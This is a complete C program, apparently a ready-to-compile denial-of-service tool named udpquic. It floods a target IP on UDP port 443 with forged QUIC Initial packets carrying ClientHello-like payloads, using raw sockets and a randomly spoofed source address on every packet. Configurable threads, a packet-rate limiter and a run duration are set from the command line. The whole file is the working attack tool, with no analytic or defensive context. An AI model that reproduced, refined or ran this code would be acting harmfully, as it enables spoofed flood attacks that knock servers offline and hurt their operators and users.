// gcc -O3 -march=native -mtune=native -flto -funroll-loops -pthread -s udpquic.c -o udpquic
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define QUIC_PORT 443
#define MIN_QUIC_LEN 1200
#define CMWC_CYCLE 4096
#define CMWC_A 18782ULL

typedef struct {
    uint32_t Q[CMWC_CYCLE];
    uint32_t c;
    uint32_t i;
} cmwc_state_t;

static inline void init_cmwc(cmwc_state_t *state, uint32_t seed) {
    if (seed == 0) seed = 1;
    uint32_t val = seed;
    for (int j = 0; j < CMWC_CYCLE; j++) {
        val = 69069 * val + 12345;
        state->Q[j] = val;
    }
    state->c = 362436;
    state->i = 4095;
}

static inline uint32_t rand_cmwc(cmwc_state_t *state) {
    state->i = (state->i + 1) & 4095;
    uint64_t t = CMWC_A * (uint64_t)state->Q[state->i] + state->c;
    state->c = (uint32_t)(t >> 32);
    uint32_t x = (uint32_t)t + state->c;
    state->c += (x < state->c || (x == state->c && state->c != 0));
    return (state->Q[state->i] = 0xFFFFFFFEu - x);
}

static inline uint32_t randnum(cmwc_state_t *state, uint32_t min, uint32_t max) {
    if (min > max) { uint32_t tmp = min; min = max; max = tmp; }
    uint64_t range = (uint64_t)max - min + 1;
    if (range == 0) return min;
    uint64_t rnd = (uint64_t)rand_cmwc(state);
    return min + (uint32_t)((rnd * range) >> 32);
}

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    while (nwords > 1) { sum += *buf++; nwords -= 2; }
    if (nwords > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short udp_csum(struct iphdr *iph, struct udphdr *udph, int udp_len) {
    struct {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t zero;
        uint8_t proto;
        uint16_t length;
    } pseudo = {0};
    pseudo.src_addr = iph->saddr;
    pseudo.dst_addr = iph->daddr;
    pseudo.proto = IPPROTO_UDP;
    pseudo.length = htons(udp_len);
    int total = sizeof(pseudo) + udp_len;
    unsigned short *buf = malloc(total);
    if (!buf) return 0;
    memcpy(buf, &pseudo, sizeof(pseudo));
    memcpy((char*)buf + sizeof(pseudo), udph, udp_len);
    unsigned short res = csum(buf, (total + 1) / 2);
    free(buf);
    return res;
}

volatile int limiter = 0;
volatile unsigned int pps = 0;
volatile unsigned int sleeptime = 100;
volatile int running = 1;

void *quic_flood(void *arg) {
    char *target_ip = (char *)arg;
    char packet[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *quic = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port = htons(QUIC_PORT),
        .sin_addr.s_addr = inet_addr(target_ip)
    };

    cmwc_state_t state;
    init_cmwc(&state, time(NULL) ^ (uint32_t)pthread_self() ^ getpid());

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s < 0) return NULL;

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    unsigned char client_hello_base[] = {
        0x01, 0x00, 0x02, 0x00,
        0x03, 0x03,
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0x00,
        0x00, 0x06,
        0x13, 0x01, 0x13, 0x02, 0x13, 0x03,
        0x01, 0x00
    };

    unsigned char extensions[] = {
        0x00, 0x10, 0x00, 0x0e, 0x00, 0x0c,
        0x02, 'h', '3',
        0x08, 'h', 't', 't', 'p', '/', '3',
        0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04,
        0x00, 0x33, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20,
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0x00, 0xff, 0xa5, 0x00, 0x2c, 0x2a,
        0x03, 0x04, 0x80, 0x00, 0xff, 0xf7,
        0x04, 0x04, 0x80, 0xa0, 0x00, 0x00,
        0x05, 0x04, 0x80, 0x10, 0x00, 0x00,
        0x06, 0x04, 0x80, 0x10, 0x00, 0x00,
        0x07, 0x04, 0x80, 0x10, 0x00, 0x00,
        0x08, 0x01, 0x0a
    };

    register unsigned int i = 0;

    while (running) {
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons((uint16_t)rand_cmwc(&state));
        iph->frag_off = 0;
        iph->ttl = (uint8_t[]){64, 128, 255}[randnum(&state, 0, 2)];
        iph->protocol = IPPROTO_UDP;
        iph->saddr = htonl(rand_cmwc(&state));
        iph->daddr = inet_addr(target_ip);
        iph->check = 0;

        udph->source = htons(randnum(&state, 1024, 65535));
        udph->dest = htons(QUIC_PORT);
        udph->len = 0;
        udph->check = 0;

        int off = 0;
        quic[off++] = 0xc0;
        memcpy(quic + off, "\x00\x00\x00\x01", 4); off += 4;
        uint8_t dcid_len = 8 + (randnum(&state, 0, 3) * 4);
        quic[off++] = dcid_len;
        for (int k = 0; k < dcid_len; k++) quic[off++] = rand_cmwc(&state) & 0xff;
        quic[off++] = 0;
        quic[off++] = 0;
        int header_up_to_length = off;
        int payload_target = MIN_QUIC_LEN - header_up_to_length - 1;
        if (payload_target < 200) payload_target = 200;
        quic[off++] = 0x40 | (payload_target >> 8);
        quic[off++] = payload_target & 0xff;
        quic[off++] = rand_cmwc(&state) & 0xff;
        quic[off++] = 0x06;
        quic[off++] = 0x00;

        uint32_t r;
        r = rand_cmwc(&state); memcpy(client_hello_base + 6, &r, 4);
        r = rand_cmwc(&state); memcpy(client_hello_base + 10, &r, 4);
        r = rand_cmwc(&state); memcpy(client_hello_base + 14, &r, 4);
        r = rand_cmwc(&state); memcpy(client_hello_base + 18, &r, 4);
        r = rand_cmwc(&state); memcpy(client_hello_base + 22, &r, 4);
        r = rand_cmwc(&state); memcpy(client_hello_base + 26, &r, 4);
        r = rand_cmwc(&state); memcpy(client_hello_base + 30, &r, 4);

        for (int k = 0; k < 32; k += 4) {
            r = rand_cmwc(&state);
            memcpy(extensions + 44 + k, &r, 4);
        }

        uint16_t ext_len = sizeof(extensions);
        client_hello_base[39] = ext_len >> 8;
        client_hello_base[40] = ext_len & 0xff;

        uint16_t crypto_data_len = sizeof(client_hello_base) + sizeof(extensions);
        quic[off++] = crypto_data_len >> 8;
        quic[off++] = crypto_data_len & 0xff;

        memcpy(quic + off, client_hello_base, sizeof(client_hello_base));
        off += sizeof(client_hello_base);
        memcpy(quic + off, extensions, sizeof(extensions));
        off += sizeof(extensions);

        int padding = MIN_QUIC_LEN - off;
        if (padding > 0) {
            memset(quic + off, 0xc0, padding);
            off += padding;
        }

        int udp_len = sizeof(struct udphdr) + off;
        iph->tot_len = htons(sizeof(struct iphdr) + udp_len);
        udph->len = htons(udp_len);

        iph->check = csum((unsigned short *)packet, sizeof(struct iphdr)/2);
        udph->check = udp_csum(iph, udph, udp_len);

        sendto(s, packet, sizeof(struct iphdr) + udp_len, MSG_NOSIGNAL,
               (struct sockaddr *)&sin, sizeof(sin));

        pps++;

        if (++i >= (unsigned)limiter) {
            i = 0;
            if (sleeptime > 0) usleep(sleeptime);
        }
    }

    close(s);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <target_ip> <threads> <pps_limit (-1=unlim)> <seconds>\n", argv[0]);
        return 1;
    }

    char *target = argv[1];
    int num_threads = atoi(argv[2]);
    int maxpps = atoi(argv[3]);
    int runtime = atoi(argv[4]);

    printf("Sent\n");

    pthread_t *threads = malloc(sizeof(pthread_t) * num_threads);
    if (!threads) return 1;

    limiter = 0;
    pps = 0;
    sleeptime = 100;

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, quic_flood, target);
    }

    int multiplier = 20;

    for (int i = 0; i < runtime * multiplier; i++) {
        usleep(1000000 / multiplier);

        unsigned int cur = pps * multiplier;
        pps = 0;

        if (maxpps > 0 && cur > (unsigned)maxpps) {
            if (limiter > 1) {
                limiter--;
            } else {
                sleeptime += 100;
            }
        } else {
            limiter++;
            if (sleeptime >= 25) {
                sleeptime -= 25;
            } else {
                sleeptime = 0;
            }
        }
    }

    running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    printf("finished\n");
    return 0;
}